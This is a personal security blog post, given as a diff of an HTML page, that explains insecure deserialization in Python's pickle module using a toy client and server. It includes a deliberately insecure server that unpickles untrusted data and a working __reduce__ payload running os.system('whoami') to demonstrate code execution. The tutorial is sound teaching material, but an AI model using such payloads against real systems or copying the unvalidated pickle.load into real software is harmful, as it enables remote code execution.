@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light"><head>
+    <title> Shibin B Shaji | Using Pythons Pickling to Explain Insecure Deserialization </title>
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.69.2" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="description" content="Script kiddie | Full Stack Developer | Designer | Gamer">
+    
+    <link rel="stylesheet" href="https://shibinbshaji.space/css/style.min.dc0a9303e7e14980d5b3649f68dba0679d003b7a03c56e1a9392ef72c3e0be55.css" integrity="sha256-3AqTA&#43;fhSYDVs2SfaNugZ50AO3oDxW4ak5LvcsPgvlU=" type="text/css">
+    
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    <base href="https://shibinbshaji.space">
+    
+    <link rel="shortcut icon" href="https://shibinbshaji.space/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shibinbshaji.space/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shibinbshaji.space/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shibinbshaji.space/favicons/favicon-16x16.png">
+    <link rel="canonical" href="https://shibinbshaji.space/posts/using-pythons-pickling-to-explain-insecure-deserialization/">
+    
+    
+    <script type="text/javascript" src="https://shibinbshaji.space/js/anatole-header.min.c275265a259296f3dd50e8236a77fcbcadb1dbb9597d3045c675dcc2c7c58a93.js" integrity="sha256-wnUmWiWSlvPdUOgjanf8vK2x27lZfTBFxnXcwsfFipM="></script>
+
+
+        <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+
+</head>
+<body><style>
+   
+body { background: black }
+
+.blink {
+  position: relative;
+  font-family: Monaco, Arial, Helvetica, sans-serif;
+  line-height: 24px;
+  font-size: 24px;
+  color: white;
+
+
+}
+
+.blink::after {
+  content: "";
+  position: absolute;
+  top: 0;
+  right: -15px;
+   
+  display: inline-block;
+  background-color: #606060;
+  vertical-align: top;
+  width: 10px;
+   
+  height: 24px;
+   
+  -webkit-animation: blink 1s step-end infinite;
+  animation: blink 1s step-end infinite;
+}
+
+@-webkit-keyframes blink {
+  0% { opacity: 1.0; }
+  50% { opacity: 0.0; }
+  100% { opacity: 1.0; }
+}
+
+@keyframes blink {
+  0% { opacity: 1.0; }
+  50% { opacity: 0.0; }
+  100% { opacity: 1.0; }
+}
+  </style>
+<div class="sidebar animated fadeInDown">
+    <div class="logo-title">
+      <div class="title">
+        <img src="https://shibinbshaji.space/images/profile.jpg" alt="profile picture">
+        <h3 title=""><a href="/">&lt; SHIBIN B SHAJI /&gt;<span class="blink"></span></a></h3>
+        <div class="description">
+          <p>Script kiddie | Full Stack Developer | Designer | Gamer</p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+        
+        <li>
+        <a href="https://www.linkedin.com/in/shibinbshaji/" rel="me" aria-label="Linkedin">
+          <i class="fa fa-2x fa-linkedin" aria-hidden="true"></i>
+        </a>
+        </li>
+
+        
+        <li>
+        <a href="https://twitter.com/shibinbshaji06" rel="me" aria-label="Twitter">
+          <i class="fa fa-2x fa-twitter" aria-hidden="true"></i>
+        </a>
+        </li>
+
+        
+        <li>
+        <a href="https://github.com/shibinbshaji/" rel="me" aria-label="GitHub">
+          <i class="fa fa-2x fa-github" aria-hidden="true"></i>
+        </a>
+        </li>
+
+        
+        <li>
+        <a href="https://www.instagram.com/shibinbshaji/" rel="me" aria-label="instagram">
+          <i class="fa fa-2x fa-instagram" aria-hidden="true"></i>
+        </a>
+        </li>
+
+        
+        <li>
+        <a href="mailto:shibinbshaji007@gmail.com" rel="me" aria-label="e-mail">
+          <i class="fa fa-2x fa-envelope" aria-hidden="true"></i>
+        </a>
+        </li>
+
+        
+        <li>
+        <a href="https://steamcommunity.com/id/shibinzz" rel="me" aria-label="steam">
+          <i class="fa fa-2x fa-steam" aria-hidden="true"></i>
+        </a>
+        </li>
+
+        
+    </ul>
+    <div class="footer">
+        <div class="by_farbox">&copy; Shibin B Shaji 2021 </div>
+      </div>
+    </div>
+</div>
+<div class="main">
+            <div class="page-top animated fadeInDown">
+    <ul class="nav">
+      
+        
+        
+        
+        <li><a  href="/" title="">&lt;shibin.b.shaji/&gt;</a></li>
+        
+        
+        <li><a  href="/posts/" title="">Posts</a></li>
+        
+        
+        <li><a  href="/bug-bounty/" title="">Bug Bounty</a></li>
+        
+        
+        <li><a  href="/notes/" title="">Notes</a></li>
+        
+    </ul>
+    <div class="themeswitcher">
+        <a class="theme-switch" title="Switch Theme">
+            <i class="fa fa-adjust fa-fw" aria-hidden="false"></i>
+        </a>
+    </div>
+</div>
+
+            <div class="autopagerize_page_element">
+                <div class="content">
+  <style>
+    img{
+      display: block;
+ margin-left: auto;
+ margin-right: auto;
+ width: 50%;
+    }
+    </style>
+<div class="post animated fadeInDown">
+    <div class="post-content">
+
+      <div class="post-title">
+        <h3>Using Pythons Pickling to Explain Insecure Deserialization
+        </h3>
+        
+        </div>
+
+    <p>Before I go on rambling about what insecure deserialization is, I will explain what serialization and deserialization is.</p>
+<p><strong>Serialization</strong> is the process of converting an object into a stream of bytes to store the object to memory, a database, or a file. Do not confuse object with variable. Think of it like this — variable can store only one data type at a time whereas an object can store multiple. Serialization goes by different names in different languages, it is <strong>serialization</strong> for java, <strong>pickling</strong> for python and <strong>marshalling</strong> for Perl and some other languages.</p>
+<p><strong>Deserialization</strong> is the process of converting serialized data in bytes to readable format.</p>
+<p>Allow me to demonstrate.</p>
+<p>We will be using a library called pickle in python. If you have a terminal up and running, type the following commands.</p>
+<pre><code>python3
+</code></pre><p>This will open a Python3 interactive session in the terminal. Now import the pickle library.</p>
+<pre><code>&gt;&gt;&gt;import pickle
+</code></pre><p>Next, define an object.</p>
+<pre><code>&gt;&gt;&gt;example = { &quot;name&quot; : &quot;Shibin&quot; , &quot;position&quot; : &quot;sec engineer&quot; }
+</code></pre><p>Now that we have defined our object we will pickle (serialize) it. There are a lot of functions in the pickle library whose documentation can be found here. But here, we will be using only two functions from that library — <strong>dumps()</strong> and <strong>loads()</strong>.</p>
+<p><strong>pickle.dumps()</strong> is used to pickle (serialize) the data and it takes a variable, function or class to be pickled as its argument.</p>
+<p><strong>pickle.loads()</strong> is used to unpickle (deserialize) the data and takes a variable containing byte stream as a valid arguement.</p>
+<p>Let’s pickle the object that we have.</p>
+<pre><code>&gt;&gt;&gt;pickle.dumps(example)
+</code></pre><p>This will pickle the data and the output will look somewhat like this:</p>
+<pre><code>b'\x80\x03}q\x00(X\x04\x00\x00\x00nameq\x01X\x06\x00\x00\x00Shibinq\x02X\x08\x00\x00\x00positionq\x03X\x0c\x00\x00\x00sec engineerq\x04u.'
+</code></pre><p>Now to use loads(),</p>
+<pre><code>&gt;&gt;&gt;pickle.loads(b'\x80\x03}q\x00(X\x04\x00\x00\x00nameq\x01X\x06\x00\x00\x00Shibinq\x02X\x08\x00\x00\x00positionq\x03X\x0c\x00\x00\x00sec engineerq\x04u.')
+</code></pre><p>which will give us the data back.</p>
+<pre><code>{'name': 'Shibin', 'position': 'sec engineer'}
+</code></pre><hr>
+<p>Now you might be wondering how this can potentially be a threat to be listed in <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10 vulnerabilities</a>. Insecure deserialization is when an app deserializes the data that it gets without any kind of validation, or even the authenticity of the data.</p>
+<p>Again, allow me to demonstrate.</p>
+<p>Consider that there is a (shady) Python app which has both server side(server.py) and client side(client.py). The client will pickle some data and send it over to the server and the server will unpickle the data and display it.</p>
+<p>The script for <strong>client.py</strong> is:</p>
+<pre><code>import os
+import pickle
+def serialize_exploit():
+      name = {&quot;name&quot;:&quot;shibin&quot;,&quot;pos&quot;:&quot;sec Engineer&quot;}
+      f = open(&quot;demo.pickle&quot;,&quot;wb&quot;)
+      safecode = pickle.dump(name,f)  ######
+      return safecode
+if __name__ == '__main__':
+      safecode = serialize_exploit()
+</code></pre><p>(Hmm. Shady app indeed, why does it import the os library!?!?!) The script has a function serialize_exploit() which defines an object called name. Then a file called demo.pickle is opened for writing in binary format after which <strong>dump()</strong> (not dumps()) is used to pickle the object name and write into the file.</p>
+<p>Run the client with python3.</p>
+<pre><code>&gt;&gt;&gt;python3 client.py
+</code></pre><p>The pickled data is written into the file demo.pickle. Printing the file using cat will show:</p>
+<pre><code>&gt;&gt;&gt;?}q(XnameqXshibinqXposqX
+                        sec Engineerqu.%
+</code></pre><p>The script for <strong>server.py</strong> is:</p>
+<pre><code>import os
+import pickle
+def insecure_deserialization():
+      f = open(&quot;demo.pickle&quot;,&quot;rb&quot;)
+      na = pickle.load(f)
+      return na
+if __name__ == '__main__':
+      print(insecure_deserialization())
+</code></pre><p>This script has a function called <code>insecure_deserialization()</code> which opens the file demo.pickle to read the data in binary format. The function <strong>load()</strong> (not loads()) will read the data and unpickle. This data is then printed.</p>
+<p>Run the server with python3.</p>
+<pre><code>&gt;&gt;&gt;python3 server.py
+</code></pre><p>It will print the data</p>
+<pre><code>&gt;&gt;&gt;{&quot;name&quot;:&quot;shibin&quot;,&quot;pos&quot;:&quot;sec Engineer&quot;}
+</code></pre><p>So in short, the client will pickle (serialise) some data and the server, without even validating the data it got, unpickles (deserializes) the data.
+Now begins the interesting part.</p>
+<p>Let us focus on client.py. Since there is no validation whatsoever, it will pickle any data thrown at it. So lets try to modify the script <strong>client.py</strong> as shown below</p>
+<pre><code>import os
+import pickle
+class ImVulnerable():                                 ###
+      def __reduce__(self):                           ###
+            return(os.system,('whoami',))             ###
+def serialize_exploit():
+      name = {&quot;name&quot;:&quot;shibin&quot;,&quot;pos&quot;:&quot;sec Engineer&quot;}
+      f = open(&quot;demo.pickle&quot;,&quot;wb&quot;)
+      safecode = pickle.dump(ImVulnerable(),f)        ###
+      return safecode
+if __name__ == '__main__':
+      safecode = serialize_exploit()
+</code></pre><p>The changes in lines are highlighted with hash symbols(###). We define a class <strong>ImVulnerable()</strong> and inside it is a function which returns a linux kernel command using the os library of python. This class is then passed as an argument to <strong>dump()</strong> which then, as you are familiar by now, pickles it and writes it into the file demo.pickle. The content in the file demo.pickle is now:</p>
+<pre><code>?cos
+system
+qXwhoamiq?qRq.%
+</code></pre><p>Note that we have not edited the file <strong>server.py</strong> till now. Now when I try to run the server file, it will read the demo.pickle file and then unpickles the data. This will reveal the linux kernel command instead of a text to print. The command ‘whoami’ is executed in the server script!!!!!!!</p>
+<p>If this was really a server and a client,</p>
+<h1 id="remote-code-execution-just-like-that">REMOTE CODE EXECUTION, JUST LIKE THAT!!!!!!!!!!!!</h1>
+<h2 id="how-to-prevent-this">How to prevent this:</h2>
+<ul>
+<li>DO NOT accept serialized data from untrusted sources.</li>
+<li>Run deserialization code with limited access permission.</li>
+<li>Validate user input. Cyber Security 101 — Never trust user input!</li>
+</ul>
+<p>Hope this article was straightforward. :)</p>
+
+    </div>
+    <div class="post-footer">
+      <div class="info">
+        
+        
+    <span class="separator"><a class="tag" href="/tags/infosec/">infosec</a><a class="tag" href="/tags/python/">python</a><a class="tag" href="/tags/pickle/">pickle</a><a class="tag" href="/tags/cyber-security/">cyber security</a></span>
+
+      </div>
+    </div>
+
+    
+</div>
+
+
+                </div>
+            </div>
+        </div>
+</body>
+
+
+
+<script type="text/javascript" src="https://shibinbshaji.space/js/jquery.min.86b1e8f819ee2d9099a783e50b49dff24282545fc40773861f9126b921532e4c.js" integrity="sha256-hrHo&#43;BnuLZCZp4PlC0nf8kKCVF/EB3OGH5EmuSFTLkw="></script>
+
+
+
+
+<script type="text/javascript" src="https://shibinbshaji.space/js/bundle.min.0f9c74cb78f13d1f15f33daff4037c70354f98acfbb97a6f61708966675c3cae.js" integrity="sha256-D5x0y3jxPR8V8z2v9AN8cDVPmKz7uXpvYXCJZmdcPK4="></script>
+
+<script type="text/javascript" src="https://shibinbshaji.space/js/medium-zoom.min.92f21c856129f84aeb719459b3e6ac621a3032fd7b180a18c04e1d12083f8aba.js" integrity="sha256-kvIchWEp&#43;ErrcZRZs&#43;asYhowMv17GAoYwE4dEgg/iro="></script>
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-168075703-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+</html></body>
+
+</html>
